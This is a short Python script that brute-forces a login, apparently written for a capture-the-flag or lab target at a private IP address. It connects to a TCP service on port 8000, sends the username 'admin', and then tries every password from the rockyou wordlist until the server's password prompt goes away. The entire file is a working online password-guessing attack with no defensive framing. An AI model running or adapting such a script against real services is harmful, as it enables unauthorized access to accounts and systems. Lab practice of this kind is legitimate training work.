import socket

#configuration
target_ip = "10.10.61.57"
target_port = 8000
password_wordlist = "/usr/share/wordlists/rockyou.txt"

def get_fuzz_passwords():
	print("here")
	try:
 		with open(password_wordlist, "r", encoding='utf-8') as file:
 			passwords = file.readlines()
 			print("here1")

	except:
 		with open(password_wordlist, "r", encoding='latin1') as file:
 			passwords = file.readlines()

	for password in passwords:
 		password = password.strip()
 		
 		if(attack_password(password)):
 			print(f"Correct password found: {password}")
 			break
 		else:
 			print(f"Password {password} was incorrect. Reconnecting...")



def attack_password(password):
 	try:
 		print(f"connecting with: {password}")
 		client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 		client_socket.connect((target_ip,target_port))
 		print("sending admin...")
 		client_socket.sendall(b'admin\n')

 		print("Connect attempt")

 		response = client_socket.recv(1024).decode()
 		print(f"Server response after sending admin: {response}")

 		if "Password" in response:
 			print(f"sending password: {password}")
 			client_socket.sendall(password.encode() + b"\n")

 			response = client_socket.recv(1024).decode()
 			print(response)

 			if "Password" not in response:
 				print(f"Server response for password '{password}'':{response}")
 				return True
 			else:
 				print(f"Password {password} is incorret or no response")

 		return False

 	except Exception as e:
 		print(f"Error: {e}")
 		return False

 	finally:
 		client_socket.close()

get_fuzz_passwords()